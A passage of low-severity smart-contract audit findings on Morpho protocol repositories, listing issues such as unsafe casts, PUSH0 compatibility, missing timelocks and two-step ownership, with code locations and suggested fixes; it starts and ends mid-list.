File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L2)


```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L2)




### Prevent division by 0

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

On several locations in the code precautions are not being taken for not dividing by 0, this will revert the code.
These functions can be called with 0 value in the input, this value is not checked for being bigger than 0, that means in some scenarios this can potentially trigger a division by zero.

*Instances (1)*:

```solidity
File: morpho-blue-irm/src/libraries/MathLib.sol

/// @audit b
18:         return a * WAD_INT / b;

```

[18](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L18)




### Solidity version 0.8.20 may not work on other chains due to `PUSH0`	_(duplicate of [Solidity version can cause issues in L2s that do not support PUSH0 opcode])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

The compiler for Solidity 0.8.20 switches the default target EVM version to [Shanghai](https://blog.soliditylang.org/2023/05/10/solidity-0.8.20-release-announcement/#important-note), which includes the new PUSH0 op code. This op code may not yet be implemented on all L2s, so deployment on these chains will fail. To work around this issue, use an earlier [EVM](https://docs.soliditylang.org/en/v0.8.20/using-the-compiler.html?ref=zaryabs.com#setting-the-evm-version-to-target) [version](https://book.getfoundry.sh/reference/config/solidity-compiler#evm_version)

*Instances (32)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

2: pragma solidity 0.8.20;

```

[2](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L2)

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L2)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L2)

```solidity
File: metamorpho/src/libraries/ConstantsLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ConstantsLib.sol#L2)

```solidity
File: metamorpho/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L2)

```solidity
File: metamorpho/src/libraries/EventsLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L2)

```solidity
File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L2)

```solidity
File: morpho-blue-bundlers/src/ethereum/libraries/MainnetLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IMorphoBundler.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMorphoBundler.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IMulticall.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMulticall.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L2)

```solidity
File: morpho-blue-bundlers/src/libraries/ConstantsLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/libraries/ConstantsLib.sol#L2)

```solidity
File: morpho-blue-bundlers/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/libraries/ErrorsLib.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L2)

```solidity
File: morpho-blue-irm/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/ErrorsLib.sol#L2)

```solidity
File: morpho-blue-irm/src/libraries/MathLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L2)

```solidity
File: morpho-blue-irm/src/libraries/UtilsLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/UtilsLib.sol#L2)

```solidity
File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L2)

```solidity
File: morpho-blue-oracles/src/interfaces/IERC4626.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L2)

```solidity
File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L2)

```solidity
File: morpho-blue-oracles/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ErrorsLib.sol#L2)

```solidity
File: morpho-blue-oracles/src/libraries/VaultLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/VaultLib.sol#L2)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L2)

```solidity
File: universal-rewards-distributor/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/ErrorsLib.sol#L2)

```solidity
File: universal-rewards-distributor/src/libraries/EventsLib.sol

2: pragma solidity ^0.8.0;

```

[2](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L2)




### Consider to Use `SafeCast` for Casting

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Casting from larger types to smaller ones can potentially lead to overflows and thus unexpected behavior.

OpenZeppelin's SafeCast library provides functions for safe type conversions, throwing an error whenever an overflow would occur. It is generally recommended to use SafeCast or similar protective measures when performing type conversions to ensure the accuracy of your computations and the security of your contracts.

*Instances (3)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit uint256 -> uint184
226:             pendingTimelock.update(uint184(newTimelock), timelock);

/// @audit uint256 -> uint96
242:         fee = uint96(newFee);

/// @audit uint256 -> uint64
315:         config[id].removableAt = uint64(block.timestamp + timelock);

```

[226](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L226), [242](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L242), [315](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L315)



### Unsafe `uint` to `int` conversion

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

The `int` type in Solidity uses the [two's complement system](https://en.wikipedia.org/wiki/Two%27s_complement), so it is possible to accidentally overflow a very large `uint` to an `int`, even if they share the same number of bytes (e.g. a `uint256 number > type(uint128).max` will overflow a `int256` cast).
Consider using the [SafeCast](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol) library to prevent any overflows.

*Instances (1)*:

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

/// @audit uint256 -> int256
140:             int256 elapsed = int256(block.timestamp - market.lastUpdate);

```

[140](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L140)




### Consider implementing two-step procedure for updating protocol addresses

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

A copy-paste error or a typo may end up bricking protocol functionality, or sending tokens to an address with no known private key. Consider implementing a two-step procedure for updating protocol addresses, where the recipient is set as pending, and must 'accept' the assignment by making an affirmative call. A straight forward way of doing this would be to have the target contracts implement [EIP-165](https://eips.ethereum.org/EIPS/eip-165), and to have the 'set' functions ensure that the recipient is of the right interface type.

*Instances (6)*:

<summary>see instances</summary>


```solidity
File: metamorpho/src/MetaMorpho.sol

186:     function setCurator(address newCurator) external onlyOwner {
187:             if (newCurator == curator) revert ErrorsLib.AlreadySet();
188:     
189:             curator = newCurator;
190:     
191:             emit EventsLib.SetCurator(newCurator);
192:         }

204:     function setSkimRecipient(address newSkimRecipient) external onlyOwner {
205:             if (newSkimRecipient == skimRecipient) revert ErrorsLib.AlreadySet();
206:     
207:             skimRecipient = newSkimRecipient;
208:     
209:             emit EventsLib.SetSkimRecipient(newSkimRecipient);
210:         }

248:     function setFeeRecipient(address newFeeRecipient) external onlyOwner {
249:             if (newFeeRecipient == feeRecipient) revert ErrorsLib.AlreadySet();
250:             if (newFeeRecipient == address(0) && fee != 0) revert ErrorsLib.ZeroFeeRecipient();
251:     
252:             // Accrue interest to the previous fee recipient set before changing it.
253:             _updateLastTotalAssets(_accrueFee());
254:     
255:             feeRecipient = newFeeRecipient;
256:     
257:             emit EventsLib.SetFeeRecipient(newFeeRecipient);
258:         }

757:     function _setGuardian(address newGuardian) internal {
758:             guardian = newGuardian;
759:     
760:             emit EventsLib.SetGuardian(_msgSender(), newGuardian);
761:     
762:             delete pendingGuardian;
763:         }

```

[186-192](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L186-L192), [204-210](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L204-L210), [248-258](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L248-L258), [757-763](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L757-L763)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

172:     function setOwner(address newOwner) external onlyOwner {
173:             require(newOwner != owner, ErrorsLib.ALREADY_SET);
174:     
175:             _setOwner(newOwner);
176:         }

193:     function _setOwner(address newOwner) internal {
194:             owner = newOwner;
195:     
196:             emit EventsLib.OwnerSet(newOwner);
197:         }

```

[172-176](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L172-L176), [193-197](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L193-L197)




### Using zero as a parameter

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Taking `0` as a valid argument in Solidity without checks can lead to severe security issues. A historical example is the infamous `0x0` address bug where numerous tokens were lost. This happens because `0` can be interpreted as an uninitialized `address`, leading to transfers to the `0x0` `address`, effectively burning tokens. Moreover, `0` as a denominator in division operations would cause a runtime exception. It's also often indicative of a logical error in the caller's code. It's important to always validate input and handle edge cases like `0` appropriately. Use `require()` statements to enforce conditions and provide clear error messages to facilitate debugging and safer code.

*Instances (4)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit 1 parameter
312:         _setCap(id, 0);

/// @audit 1 parameter
437:                     MORPHO.supply(allocation.marketParams, suppliedAssets, 0, address(this), hex"");

/// @audit 1 parameter
811:                 try MORPHO.supply(marketParams, toSupply, 0, address(this), hex"") {

/// @audit 1 parameter
835:                 try MORPHO.withdraw(marketParams, toWithdraw, 0, address(this), address(this)) {

```

[312](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L312), [437](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L437), [811](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L811), [835](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L835)





### Consider using named mappings	_(duplicate of [Named mappings should be used])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Consider moving to solidity version 0.8.18 or later, and using [named mappings](https://ethereum.stackexchange.com/a/145555) to make it easier to understand the purpose of each mapping

*Instances (8)*:


```solidity
File: metamorpho/src/MetaMorpho.sol

67:     mapping(address => bool) public isAllocator;

73:     mapping(Id => MarketConfig) public config;

82:     mapping(Id => PendingUint192) public pendingCap;

```

[67](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L67), [73](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L73), [82](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L82)

```solidity
File: metamorpho/src/MetaMorphoFactory.sol

22:     mapping(address => bool) public isMetaMorpho;

```

[22](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L22)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

57:     mapping(Id => int256) public rateAtTarget;

```

[57](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L57)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

30:     mapping(address account => mapping(address reward => uint256 amount)) public claimed;

36:     mapping(address => bool) public isUpdater;

```

[30](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L30), [36](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L36)

```solidity
File: universal-rewards-distributor/src/UrdFactory.sol

15:     mapping(address => bool) public isUrd;

```

[15](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L15)




### Average borrow rate approximation is overestimating real borrow rate

**Severity:** Low risk

**Context:** [AdaptiveCurveIrm.sol#L148-L161](morpho-blue-irm/src/AdaptiveCurveIrm.sol#L148-L161)

**Description**: The `AdaptiveCurve` approximates an integral involving `exp(speed*x)` (corresponding to `_newRateAtTarget(start, speed*x)`) with the trapezoidal rule of N = 2 (3 terms). As the function is convex the rule should overestimate the integral and therefore the borrow rates.
The users will have to pay more interest than they should have to.

**Recommendation**: Estimate the max approximation error and decide if it is significant. Consider using a larger `N` for the approximation otherwise.



### Add limits `newTimelock` to prevent excessively long timelocks	_(this issue has been rejected)_

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L201-L201](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L201-L201)

**Description**:  The `setTimelock` function allows the contract owner to set any `newTimelock` value without any upper limit. This poses a potential risk as an excessively high `newTimelock` value could make the `acceptRoot` function effectively unusable, preventing the acceptance of new merkle roots. The absence of an upper limit on the `newTimelock` variable could lead to situations where the timelock duration is unreasonably long, essentially freezing the functionality of updating the merkle root indefinitely.

**Recommendation**: Introduce a maximum allowable value for `newTimelock`. This can be achieved by defining a constant that represents the maximum timelock duration and adding a `require` statement in the `setTimelock` function to ensure that the provided `newTimelock` does not exceed this maximum value.



### Address validation	_(duplicate of [Possible loss of ownership])_

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L193-L193](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L193-L193)

**Description:** The `_setOwner()` method does not include a zero address check.

**Recommendation:** Protections can be added to the contracts themselves or to the deploy process:
- Add a zero address check to avoid a misconfigured updates.



### Bound `newTimelock` values to a MIN_TIMELOCK_DELAY and MAX_TIMELOCK_DELAY	_(duplicate of [Add limits `newTimelock` to prevent excessively long timelocks])_

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L154-L154](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L154-L154)

**Description**: Lack of minimum and maximum value checks for timelock periods can result in unexpected outcomes.

> If the owner accidentally / maliciously sets the timelock to a large value (like 1 million days), the upcoming root submission will be grieved until the owner sets it back to normal value. 

Since the scenario is highly unlikely, a bound check introduced by other protocols would help in providing additional protections to the protocol's timelock feature.

**Recommendation**: Add a MIN_TIMELOCK_DELAY and MAX_TIMELOCK_DELAY constant variables and make sure the timelock period is always within those limits.

> For more info: https://docs.uniswap.org/contracts/v3/reference/governance/overview#timelock



### The `URD` owner can front-run user's claim execution

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L115-L115](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L115-L115)

**Description**: The `URD` contract updater can update the roots without a timelock using the `setRoot()` function. 

By changing the root before the user's claim() call, the owner will be able to frontrun the claim function execution by setting the new root to a different value or a zero bytes32 string. 

**Recommendation**: Should consider disallowing updating of the root by the owner without a minimum timelock period



### Make sure `newRoot` is not zero in `setRoot()` method

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L143-L143](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L143-L143)

**Description**: Owner / Updater (if timelock is zero) can grieve the distribution by force updating the root to a zero bytes32 string. 

**Recommendation**: Add checks to prevent owner / updater from updating zero values.



### `WNativeBundler` should reject ether if not coming from `WRAPPED_NATIVE`	_(duplicate of [Unused/empty `receive`/`fallback`])_

**Severity:** Low risk

**Context:** [WNativeBundler.sol#L39-L39](morpho-blue-bundlers/src/WNativeBundler.sol#L39-L39)

**Description**: `WNativeBundler` contract includes a `receive()` function that allows it to accept native Ether (ETH) from any address. This design could potentially lead to unintentional locking of Ether in the contract if Ether is sent by addresses other than the `WRAPPED_NATIVE`. 

**Recommendation**: Only the `WRAPPED_NATIVE` address (representing a wrapped native token, such as WETH) should be allowed to send Ether to this contract, likely as part of the unwrapping process. The `receive()` function should be modified to include a require statement that checks the `msg.sender`.

```solidity
/// @dev Restricts the receipt of native tokens to the wrapped native contract only.
receive() external payable {
    require(msg.sender == WRAPPED_NATIVE, "!WRAPPED_NATIVE");
}
```



### Use of `_msgSender()` lead to confussion and increased gas costs

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L140-L140](metamorpho/src/MetaMorpho.sol#L140-L140), [MetaMorpho.sol#L148-L148](metamorpho/src/MetaMorpho.sol#L148-L148), [MetaMorpho.sol#L158-L158](metamorpho/src/MetaMorpho.sol#L158-L158), [MetaMorpho.sol#L165-L165](metamorpho/src/MetaMorpho.sol#L165-L165), [MetaMorpho.sol#L244-L244](metamorpho/src/MetaMorpho.sol#L244-L244), [MetaMorpho.sol#L302-L302](metamorpho/src/MetaMorpho.sol#L302-L302), [MetaMorpho.sol#L317-L317](metamorpho/src/MetaMorpho.sol#L317-L317), [MetaMorpho.sol#L336-L336](metamorpho/src/MetaMorpho.sol#L336-L336), [MetaMorpho.sol#L384-L384](metamorpho/src/MetaMorpho.sol#L384-L384), [MetaMorpho.sol#L420-L420](metamorpho/src/MetaMorpho.sol#L420-L420), [MetaMorpho.sol#L439-L439](metamorpho/src/MetaMorpho.sol#L439-L439), [MetaMorpho.sol#L456-L456](metamorpho/src/MetaMorpho.sol#L456-L456), [MetaMorpho.sol#L465-L465](metamorpho/src/MetaMorpho.sol#L465-L465), [MetaMorpho.sol#L474-L474](metamorpho/src/MetaMorpho.sol#L474-L474), [MetaMorpho.sol#L481-L481](metamorpho/src/MetaMorpho.sol#L481-L481), [MetaMorpho.sol#L520-L520](metamorpho/src/MetaMorpho.sol#L520-L520)

**Description**:  In typical scenarios, `_msgSender()` is employed to provide flexibility for contracts to be compatible with meta-transactions, where the context of the sender can be different from `msg.sender` (the immediate sender of the message). However, in this contract, `_msgSender()` is simply returning `msg.sender` without any additional logic to support meta-transactions. This unnecessary usage of `_msgSender()` leads to confusion and increased gas costs for each call, as it adds an extra layer of function call overhead compared to directly using `msg.sender`.

**Recommendation**: Replace all instances of `_msgSender()` with `msg.sender`. This direct approach is more gas-efficient and straightforward. Will also avoid any confusion regarding metatransactions.



### `setFee` should be timelocked	_(duplicate of [`setFee` is not time-locked])_

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L233-L233](metamorpho/src/MetaMorpho.sol#L233-L233)

**Description**:

To protect depositors from a malicious vault owner, changing the MetaMorpho vault's `fee` should be done behind a timelock. A malicious vault owner could initially set a zero fee to entice depositors, and then frontrun a whale deposit by setting the fee to the maximum, 50%. Even if the whale were to withdraw soon after, they would still be impacted by this because the interest accrued is calculated prior to them withdrawing.

**Recommendation**:

Require the `fee` change to be behind a timelock.



### Unclaimed Rewards Due to Blacklisted Account	_(duplicate of [An account might never get their rightfully earned rewards sent to them])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Impact

The vulnerability presents a Low severity risk as the funds are recoverable, but there is a loss of funds during the period of a reward distribution. If an account is blacklisted by the reward token contract, the eligible rewards cannot be claimed, leading to a lock of reward funds in the UniversalRewardsDistributor contract.

- Proof of Concept

The root cause of the vulnerability is that when an rewarded account gets blacklisted by the reward token contract (e.g., USDC), it cannot claim rewards during the reward distribution period. The funds meant for the blacklisted account become locked in the UniversalRewardsDistributor contract.

https://cantina.xyz/competitions/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L133

```solidity
// File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol
115:    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        ...
131:        claimed[account][reward] = claimable;
132:
133:        ERC20(reward).safeTransfer(account, amount); // <= FOUND: account cannot be changed since it was encoded in the Merkle root
134:
135:        emit EventsLib.Claimed(account, reward, amount);
136:    }
```

**Scenario:**
   - Account 'Bob' is eligible for rewards in USDC during a reward distribution.
   - Bob's account gets blacklisted by the USDC contract.
   - Bob is unable to claim the rewards during the distribution.
   - Bob's account cannot be changed since it was encoded in the Merkle root.
   - The reward funds for Bob remain locked in the UniversalRewardsDistributor contract.

- Tools Used

Manual Review

- Recommended Mitigation Steps

It is recommended to enhance the claim function by adding a recipient address argument. This modification allows the claim function to transfer the rewards to a specified recipient address, even if the original account is blacklisted. 

```patch
-    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof) ... {
+    function claim(address account, address recipient, address reward, uint256 claimable, bytes32[] calldata proof) ... {
      ...
-    ERC20(reward).safeTransfer(account, claimable);
+    ERC20(reward).safeTransfer(recipient, claimable);
}
```



### Make setting a new owner a two step process

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

The current setOwner function does not validate for zero address. The assumption is that the owner will be responsible in setting it.

But, lets say, the owners sets the new address, due to copy paste error, a different address was set. Since no one is having access to the private keys for the new address, the owner related functionality will be lost.

It is best to separate the proposal and execution of new owner as two steps.


steps:

- a) the current owner can propose the new owner.
- b) the newly proposed owner will have to claim the position in a separate step. 



### Protocol's usability becomes very limited when access to Chainlink oracle data feed is blocked	_(duplicate of [Unhandled revert could lock price oracle access])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Eventhough the protocol assumes that chainlink will keep it's promise to provide fresh data , if the data feed is blocked that might become a problem(there is no mention of this issue in comments). 
To get the price of a chainlink feed `latestRoundData` is being used here https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L23

As https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/ mentions, it is possible that Chainlink’s "multisigs can immediately block access to price feeds at will". When this occurs, executing latestRoundData reverts , which causes denial of service for the `getPrice()`
function.

Recommendation:

Put the getPrice function inside a try-catch block. 



### Ensure setCurator/Allocator/Guardian Is A Part Of The Deployment Script

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Inside The MetaMorpho the curator address can be set here https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L186 ,
if it is not set yet then the functions submitCap (if it's an emergency to change the cap of a market) , and marketRemoval(if it's an emergency to remove a market) will revert when called . 

Recommendation:

Ensure  setCurator Is A Part Of The Deployment Script and is set to the correct address , same goes for allocator and guardian.




### Signature/Proof verifications can revert for multiple reasons other than frontrunning.

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description
Morpho Blue Bundlers use proofs and authorization signatures to show the validity of an action. 

